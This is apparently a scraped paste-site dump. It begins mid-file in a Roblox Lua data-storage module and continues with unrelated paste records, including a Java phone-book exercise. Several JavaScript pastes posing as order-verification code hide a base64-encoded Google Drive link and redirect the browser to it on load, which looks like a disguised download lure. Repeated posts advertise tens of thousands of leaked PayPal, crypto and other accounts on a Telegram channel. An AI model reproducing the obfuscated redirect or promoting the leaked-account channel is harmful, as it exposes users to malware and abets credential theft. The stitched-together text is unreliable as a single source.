
	if ProfileStore.IsClosing == true then
		return false
	end

	WaitForStoreReady(self)

	local exp_backoff = 1

	while ProfileStore.IsClosing == false do

		-- Updating profile:

		local loaded_data = UpdateAsync(
			self,
			profile_key,
			{
				ExistingProfileHandle = nil,
				MissingProfileHandle = nil,
				EditProfile = function(latest_data)

					local global_updates = latest_data.GlobalUpdates
					local update_list = global_updates[2]
					--{
					--	update_index,
					--	{
					--		{update_index, data}, ...
					--	},
					--},

					global_updates[1] += 1
					table.insert(update_list, {global_updates[1], message})

					-- Clearing queue if above limit:

					while #update_list > MAX_MESSAGE_QUEUE do
						table.remove(update_list, 1)
					end

				end,
			},
			is_mock
		)

		if loaded_data ~= nil then

			local session_token = SessionToken(self.Name, profile_key, is_mock)

			local profile = ActiveSessionCheck[session_token]

			if profile ~= nil then

				-- The message was sent to a profile that is active in this server:
				profile:Save()

			else

				local meta_data = loaded_data.MetaData or {}
				local active_session = meta_data.ActiveSession
				local session_load_count = meta_data.SessionLoadCount or 0

				if type(active_session) == ""table"" and type(active_session[3]) == ""string"" then
					-- Request the remote server to auto-save sooner and receive the message:
					task.spawn(MessagingService.PublishAsync, MessagingService, ""PS_"" .. active_session[3], {LoadCount = session_load_count})
				end

			end

			return true

		else

			task.wait(exp_backoff) -- A DataStore call has likely ended in an error - repeat the call shortly
			exp_backoff = math.min(20, exp_backoff * 2)

		end

	end

	return false

end

function ProfileStore:GetAsync(profile_key, version)

	local is_mock = ReadMockFlag()

	if type(profile_key) ~= ""string"" then
		error(`[{script.Name}]: profile_key must be a string`)
	elseif string.len(profile_key) == 0 then
		error(`[{script.Name}]: Invalid profile_key`)
	elseif string.len(profile_key) > 50 then
		error(`[{script.Name}]: profile_key is too long`)
	end

	if ProfileStore.IsClosing == true then
		return nil
	end

	WaitForStoreReady(self)

	if version ~= nil and (is_mock or DataStoreState ~= ""Access"") then
		return nil -- No version support in mock mode
	end

	local exp_backoff = 1

	while ProfileStore.IsClosing == false do

		-- Load profile:

		local loaded_data, key_info = UpdateAsync(
			self,
			profile_key,
			{
				ExistingProfileHandle = nil,
				MissingProfileHandle = function(latest_data)

					latest_data.Data = DeepCopyTable(self.template)
					latest_data.MetaData = {
						ProfileCreateTime = os.time(),
						SessionLoadCount = 0,
						ActiveSession = nil,
						ForceLoadSession = nil,
						MetaTags = {}, -- Backwards compatibility with ProfileService
					}

				end,
				EditProfile = nil,
			},
			is_mock,
			true, -- Use :GetAsync()
			version -- DataStore key version
		)

		-- Handle load_data:

		if loaded_data ~= nil then

			if key_info == nil then
				return nil -- Load was successful, but the key was empty - return no profile object
			end

			local profile = Profile.New(loaded_data, key_info, self, profile_key, is_mock)
			profile.view_mode = true

			return profile

		else

			task.wait(exp_backoff) -- A DataStore call has likely ended in an error - repeat the call shortly
			exp_backoff = math.min(20, exp_backoff * 2)

		end

	end

	return nil -- Game started shutting down - don't return the profile

end

function ProfileStore:RemoveAsync(profile_key)

	local is_mock = ReadMockFlag()

	if type(profile_key) ~= ""string"" or string.len(profile_key) == 0 then
		error(`[{script.Name}]: Invalid profile_key`)
	end

	if ProfileStore.IsClosing == true then
		return false
	end

	WaitForStoreReady(self)

	local wipe_status = false

	local next_in_queue = WaitInUpdateQueue(SessionToken(self.Name, profile_key, is_mock))

	if is_mock == true then -- Used when the profile is accessed through ProfileStore.Mock

		local mock_data_store = UserMockStore[self.Name]

		if mock_data_store ~= nil then
			mock_data_store[profile_key] = nil
			if next(mock_data_store) == nil then
				UserMockStore[self.Name] = nil
			end
		end

		wipe_status = true
		task.wait() -- Simulate API call yield

	elseif DataStoreState ~= ""Access"" then -- Used when API access is disabled

		local mock_data_store = MockStore[self.Name]

		if mock_data_store ~= nil then
			mock_data_store[profile_key] = nil
			if next(mock_data_store) == nil then
				MockStore[self.Name] = nil
			end
		end

		wipe_status = true
		task.wait() -- Simulate API call yield

	else -- Live DataStore

		wipe_status = pcall(function()
			self.data_store:RemoveAsync(profile_key)
		end)

	end

	next_in_queue()

	return wipe_status

end

local ProfileVersionQuery = {}
ProfileVersionQuery.__index = ProfileVersionQuery

function ProfileVersionQuery.New(profile_store, profile_key, sort_direction, min_date, max_date, is_mock)

	local self = {
		profile_store = profile_store,
		profile_key = profile_key,
		sort_direction = sort_direction,
		min_date = min_date,
		max_date = max_date,

		query_pages = nil,
		query_index = 0,
		query_failure = false,

		is_query_yielded = false,
		query_queue = {},

		is_mock = is_mock,
	}
	setmetatable(self, ProfileVersionQuery)

	return self

end

function MoveVersionQueryQueue(self) -- Hidden ProfileVersionQuery method
	while #self.query_queue > 0 do

		local queue_entry = table.remove(self.query_queue, 1)

		task.spawn(queue_entry)

		if self.is_query_yielded == true then
			break
		end

	end
end

local VersionQueryNextAsyncStackingFlag = false
local WarnAboutVersionQueryOnce = false

function ProfileVersionQuery:NextAsync()

	local is_stacking = VersionQueryNextAsyncStackingFlag == true
	VersionQueryNextAsyncStackingFlag = false

	WaitForStoreReady(self.profile_store)

	if ProfileStore.IsClosing == true then
		return nil -- Silently fail :NextAsync() requests
	end

	if self.is_mock == true or DataStoreState ~= ""Access"" then
		if IsStudio == true and WarnAboutVersionQueryOnce == false then
			WarnAboutVersionQueryOnce = true
			warn(`[{script.Name}]: :VersionQuery() is not supported in mock mode!`)
		end
		return nil -- Silently fail :NextAsync() requests
	end

	local profile
	local is_finished = false

	local function query_job()

		if self.query_failure == true then
			is_finished = true
			return
		end

		-- First ""next"" call loads version pages:

		if self.query_pages == nil then

			self.is_query_yielded = true

			task.spawn(function()
				VersionQueryNextAsyncStackingFlag = true
				profile = self:NextAsync()
				is_finished = true
			end)

			local list_success, error_message = pcall(function()
				self.query_pages = self.profile_store.data_store:ListVersionsAsync(
					self.profile_key,
					self.sort_direction,
					self.min_date,
					self.max_date
				)
				self.query_index = 0
			end)

			if list_success == false or self.query_pages == nil then
				warn(`[{script.Name}]: Version query fail - {tostring(error_message)}`)
				self.query_failure = true
			end

			self.is_query_yielded = false

			MoveVersionQueryQueue(self)

			return

		end

		local current_page = self.query_pages:GetCurrentPage()
		local next_item = current_page[self.query_index + 1]

		-- No more entries:

		if self.query_pages.IsFinished == true and next_item == nil then
			is_finished = true
			return
		end

		-- Load next page when this page is over:

		if next_item == nil then

			self.is_query_yielded = true
			task.spawn(function()
				VersionQueryNextAsyncStackingFlag = true
				profile = self:NextAsync()
				is_finished = true
			end)

			local success, error_message = pcall(function()
				self.query_pages:AdvanceToNextPageAsync()
				self.query_index = 0
			end)

			if success == false or #self.query_pages:GetCurrentPage() == 0 then
				self.query_failure = true
			end

			self.is_query_yielded = false
			MoveVersionQueryQueue(self)

			return

		end

		-- Next page item:

		self.query_index += 1
		profile = self.profile_store:GetAsync(self.profile_key, next_item.Version)
		is_finished = true

	end

	if self.is_query_yielded == false then
		query_job()
	else
		if is_stacking == true then
			table.insert(self.query_queue, 1, query_job)
		else
			table.insert(self.query_queue, query_job)
		end
	end

	while is_finished == false do
		task.wait()
	end

	return profile

end

function ProfileStore:VersionQuery(profile_key, sort_direction, min_date, max_date)

	local is_mock = ReadMockFlag()

	if type(profile_key) ~= ""string"" or string.len(profile_key) == 0 then
		error(`[{script.Name}]: Invalid profile_key`)
	end

	-- Type check:

	if sort_direction ~= nil and (typeof(sort_direction) ~= ""EnumItem""
		or sort_direction.EnumType ~= Enum.SortDirection) then
		error(`[{script.Name}]: Invalid sort_direction ({tostring(sort_direction)})`)
	end

	if min_date ~= nil and typeof(min_date) ~= ""DateTime"" and typeof(min_date) ~= ""number"" then
		error(`[{script.Name}]: Invalid min_date ({tostring(min_date)})`)
	end

	if max_date ~= nil and typeof(max_date) ~= ""DateTime"" and typeof(max_date) ~= ""number"" then
		error(`[{script.Name}]: Invalid max_date ({tostring(max_date)})`)
	end

	min_date = typeof(min_date) == ""DateTime"" and min_date.UnixTimestampMillis or min_date
	max_date = typeof(max_date) == ""DateTime"" and max_date.UnixTimestampMillis or max_date

	return ProfileVersionQuery.New(self, profile_key, sort_direction, min_date, max_date, is_mock)

end

-- DataStore API access check:

if IsStudio == true then

	task.spawn(function()

		local new_state = ""NoAccess""

		local status, message = pcall(function()
			-- This will error if current instance has no Studio API access:
			DataStoreService:GetDataStore(""____PS""):SetAsync(""____PS"", os.time())
		end)

		local no_internet_access = status == false and string.find(message, ""ConnectFail"", 1, true) ~= nil

		if no_internet_access == true then
			warn(`[{script.Name}]: No internet access - check your network connection`)
		end

		if status == false and
			(string.find(message, ""403"", 1, true) ~= nil or -- Cannot write to DataStore from studio if API access is not enabled
				string.find(message, ""must publish"", 1, true) ~= nil or -- Game must be published to access live keys
				no_internet_access == true) then -- No internet access

			new_state = if no_internet_access == true then ""NoInternet"" else ""NoAccess""
			print(`[{script.Name}]: Roblox API services unavailable - data will not be saved`)
		else
			new_state = ""Access""
			print(`[{script.Name}]: Roblox API services available - data will be saved`)
		end

		DataStoreState = new_state
		ProfileStore.DataStoreState = new_state

	end)

else

	DataStoreState = ""Access""
	ProfileStore.DataStoreState = ""Access""

end

-- Update loop:

RunService.Heartbeat:Connect(function()

	-- Auto saving:

	local auto_save_list_length = #AutoSaveList
	if auto_save_list_length > 0 then
		local auto_save_index_speed = AUTO_SAVE_PERIOD / auto_save_list_length
		local os_clock = os.clock()
		while os_clock - LastAutoSave > auto_save_index_speed do
			LastAutoSave = LastAutoSave + auto_save_index_speed
			local profile = AutoSaveList[AutoSaveIndex]
			if os_clock - profile.load_timestamp < AUTO_SAVE_PERIOD / 2 then
				-- This profile is freshly loaded - auto saving immediately is not necessary:
				profile = nil
				for _ = 1, auto_save_list_length - 1 do
					-- Move auto save index to the right:
					AutoSaveIndex = AutoSaveIndex + 1
					if AutoSaveIndex > auto_save_list_length then
						AutoSaveIndex = 1
					end
					profile = AutoSaveList[AutoSaveIndex]
					if os_clock - profile.load_timestamp >= AUTO_SAVE_PERIOD / 2 then
						break
					else
						profile = nil
					end
				end
			end
			-- Move auto save index to the right:
			AutoSaveIndex = AutoSaveIndex + 1
			if AutoSaveIndex > auto_save_list_length then
				AutoSaveIndex = 1
			end
			-- Perform save call:
			if profile ~= nil then
				task.spawn(SaveProfileAsync, profile) -- Auto save profile in new thread
			end
		end
	end

	-- Critical state handling:

	if ProfileStore.IsCriticalState == false then
		if #IssueQueue >= CRITICAL_STATE_ERROR_COUNT then
			ProfileStore.IsCriticalState = true
			ProfileStore.OnCriticalToggle:Fire(true)
			CriticalStateStart = os.clock()
			warn(`[{script.Name}]: Entered critical state`)
		end
	else
		if #IssueQueue >= CRITICAL_STATE_ERROR_COUNT then
			CriticalStateStart = os.clock()
		elseif os.clock() - CriticalStateStart > CRITICAL_STATE_EXPIRE then
			ProfileStore.IsCriticalState = false
			ProfileStore.OnCriticalToggle:Fire(false)
			warn(`[{script.Name}]: Critical state ended`)
		end
	end

	-- Issue queue:

	while true do
		local issue_time = IssueQueue[1]
		if issue_time == nil then
			break
		elseif os.clock() - issue_time > CRITICAL_STATE_ERROR_EXPIRE then
			table.remove(IssueQueue, 1)
		else
			break
		end
	end

end)

-- Release all loaded profiles when the server is shutting down:

task.spawn(function()

	while DataStoreState == ""NotReady"" do
		task.wait()
	end

	if DataStoreState ~= ""Access"" then

		game:BindToClose(function()
			ProfileStore.IsClosing = true
			task.wait() -- Mock shutdown delay
		end)

		return -- Don't wait for profiles to properly save in mock mode so studio could end the simulation faster

	end

	game:BindToClose(function()

		ProfileStore.IsClosing = true

		-- Release all active profiles:
		-- (Clone AutoSaveList to a new table because AutoSaveList changes when profiles are released)

		local on_close_save_job_count = 0
		local active_profiles = {}
		for index, profile in ipairs(AutoSaveList) do
			active_profiles[index] = profile
		end

		-- Release the profiles; Releasing profiles can trigger listeners that release other profiles, so check active state:
		for _, profile in ipairs(active_profiles) do
			if profile:IsActive() == true then
				on_close_save_job_count = on_close_save_job_count + 1
				task.spawn(function() -- Save profile on new thread
					SaveProfileAsync(profile, true, nil, ""Shutdown"")
					on_close_save_job_count = on_close_save_job_count - 1
				end)
			end
		end

		-- Yield until all active profile jobs are finished:
		while on_close_save_job_count > 0 or ActiveProfileLoadJobs > 0 or ActiveProfileSaveJobs > 0 do
			task.wait()
		end

		return -- We're done!

	end)

end)

return ProfileStore"
NvkHDc7v,Order.js,jm33,JavaScript,Wednesday 23rd of April 2025 03:53:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47557/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Yz9rjVLm,Crypto Accounts,SpawnKz,JavaScript,Wednesday 23rd of April 2025 03:52:36 AM CDT,33467 Accounts Posted On https://t.me/leakedbyeminem
yYJ3s9rV,Market.js,jm33,JavaScript,Wednesday 23rd of April 2025 03:38:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05398/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EqUW4PvE,PayPal with Balance,SpawnKz,JavaScript,Wednesday 23rd of April 2025 03:37:13 AM CDT,65668 Accounts Posted On https://t.me/leakedbyeminem
x5JnmVaq,[NP] Phone Book,dzocesrce,Java,Wednesday 23rd of April 2025 03:35:36 AM CDT,"import java.util.Scanner;
import java.util.Comparator;
import java.util.HashMap;
import java.util.Map;
import java.util.TreeMap;
import java.util.Set;
import java.util.TreeSet;
import java.util.*;
import java.util.stream.Collectors;
class Contact {
    String name;
    String number;

    public Contact(String name, String number) {
        this.name = name;
        this.number = number;
    }

    public String getName() {
        return name;
    }

    public String getNumber() {
        return number;
    }

    public boolean checkSimularity(String numberPart) {
        Set<String> allParts = new TreeSet<>();
        for(int i=0;i<number.length();i++) {
            for(int j=i+3;j<=number.length();j++) {
                allParts.add(number.substring(i,j));
            }
        }
        //System.out.println(allParts);
        if(allParts.contains(numberPart))
            return true;
        return false;
    }

    @Override
    public String toString() {
        return String.format(""%s %s"",getName(),getNumber());
    }
}

class DuplicateNumberException extends Exception{
    public DuplicateNumberException(String number) {
        super(String.format(""Duplicate number: %s"",number));
    }
}

class PhoneBook {
    Map<String,Contact> contactsByNumberMap = new TreeMap<>();
    Map<String,List<Contact>> contactsByNameMap = new TreeMap<>();
    public void addContact(String name , String number) throws DuplicateNumberException {
        if(contactsByNumberMap.containsKey(number))
            throw new DuplicateNumberException(number);
        Contact contact = new Contact(name, number);
        contactsByNumberMap.putIfAbsent(number, contact);
        contactsByNameMap.putIfAbsent(name, new ArrayList<>());
        contactsByNameMap.get(name).add(contact);

    }

    public void contactsByNumber(String numberPart) {
        Comparator<Contact> comparator = Comparator.comparing(Contact::getName).thenComparing(Contact::getNumber);
        List<Contact> simularContacts = contactsByNumberMap.values().stream().filter(i->i.checkSimularity(numberPart))
                .sorted(comparator).collect(Collectors.toList());
        if(simularContacts.isEmpty()){
            System.out.println(""NOT FOUND"");
            return ;
        }
        simularContacts.stream().forEach(i-> System.out.println(i));

    }

    public void contactsByName(String name) {
        if(!contactsByNameMap.containsKey(name)){
            System.out.println(""NOT FOUND"");
            return;
        }

        contactsByNameMap.get(name).stream().sorted(Comparator.comparing(Contact::getNumber)).forEach(i-> System.out.println(i));
    }
}
public class PhoneBookTest {

	public static void main(String[] args) {
		PhoneBook phoneBook = new PhoneBook();
		Scanner scanner = new Scanner(System.in);
		int n = scanner.nextInt();
		scanner.nextLine();
		for (int i = 0; i < n; ++i) {
			String line = scanner.nextLine();
			String[] parts = line.split("":"");
			try {
				phoneBook.addContact(parts[0], parts[1]);
			} catch (DuplicateNumberException e) {
				System.out.println(e.getMessage());
			}
		}
		while (scanner.hasNextLine()) {
			String line = scanner.nextLine();
            System.out.println(line);
			String[] parts = line.split("":"");
			if (parts[0].equals(""NUM"")) {
				phoneBook.contactsByNumber(parts[1]);
			} else {
				phoneBook.contactsByName(parts[1]);
			}
		}
	}

}
"
WjbqVvnv,Untitled,jm33,JavaScript,Wednesday 23rd of April 2025 03:22:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16384/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vwz9qFK9,Leaked Accounts - Fresh Hits,WantingTrae,JavaScript,Wednesday 23rd of April 2025 03:21:48 AM CDT,17778 Accounts Posted On https://t.me/leakedbyeminem
z4yHHbix,Products.js,jm33,JavaScript,Wednesday 23rd of April 2025 03:07:13 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76574/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eCixsaEU,Chaturbate with Tokens,WantingTrae,JavaScript,Wednesday 23rd of April 2025 03:06:25 AM CDT,06652 Accounts Posted On https://t.me/leakedbyeminem
Etas79X0,Order.js,jm33,JavaScript,Wednesday 23rd of April 2025 02:51:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/61476/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
